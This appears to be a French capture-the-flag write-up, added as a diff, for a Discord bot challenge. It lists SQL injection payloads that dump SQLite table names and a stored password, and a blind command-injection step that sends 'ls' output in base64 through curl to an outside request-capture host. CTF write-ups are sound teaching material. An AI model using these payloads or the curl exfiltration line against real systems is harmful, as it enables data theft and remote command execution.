@@ -1,0 +1,44 @@
+Etape 1:
+
+Injection sql dans un LIKE:
+-> !search %
+-> !search " OR "1"="1
+    renvoie des résultats
+
+-> !search " AND 0=1 UNION SELECT "0
+    une seule colonne
+
+-> !search " AND 0=1 UNION SELECT sqlite_version() WHERE "1"="1
+    c'est du SQLite !!! 3.34.1
+
+extraction des tables:
+-> !search " AND 0=1 UNION SELECT tbl_name FROM sqlite_master WHERE "1"="1
+Result #1:
+>Password
+Result #2:
+>data
+
+extraire les colonnes:
+-> !search " AND 0=1 UNION SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ="Password
+Results:
+Result #1:
+>CREATE TABLE "Password" (
+    "password"    TEXT
+)
+
+-> !search " AND 0=1 UNION SELECT password FROM Password WHERE "1"="1
+# HackademINT{discord_and_sql_injection}
+
+Etape 2:
+On peut maintenant executer une commande mais sans retour
+
+-> curl https://star2021.free.beeceptor.com/?p=$(ls|base64)
+bot.py
+flag.txt
+launch-bot
+launch-bot.c
+secret_db.db
+toke
+
+on cat le flag.txt
+HackademINT{discord_and_reverse_shell}
